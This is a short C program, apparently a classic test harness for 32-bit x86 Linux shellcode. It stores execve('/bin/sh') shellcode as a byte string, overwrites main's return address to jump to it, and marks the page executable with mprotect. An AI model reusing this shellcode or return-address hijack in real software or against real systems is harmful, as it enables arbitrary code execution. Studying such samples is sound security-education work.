#include<stdio.h>
#include<sys/mman.h>
#include<errno.h>
char shellcode[]="\xeb\x2a\x5e\x89\x76\x08\xc6\x46"
	         "\x07\x00\xc7\x46\x0c\x00\x00\x00"
 		 "\x00\xb8\x0b\x00\x00\x00\x89\xf3"
		 "\x8d\x4e\x08\x8d\x56\x0c\xcd\x80"
		 "\xb8\x01\x00\x00\x00\xbb\x00\x00"
		 "\x00\x00\xcd\x80\xe8\xd1\xff\xff"
		 "\xff\x2f\x62\x69\x6e\x2f\x73\x68"
		 "\x00\x5d\xc3"
;
int pagesize=4096;
void main(){
	int *ret;
	ret=(int*)&ret+4;
	(*ret)=(int)shellcode;
	errno=0;
	//printf("%u\n",shellcode);
	//printf("%u\n",((int)shellcode)&~(pagesize-1));
	mprotect((char*)(((int)shellcode)&~(pagesize-1)),4096,PROT_EXEC|PROT_WRITE|PROT_READ);
}
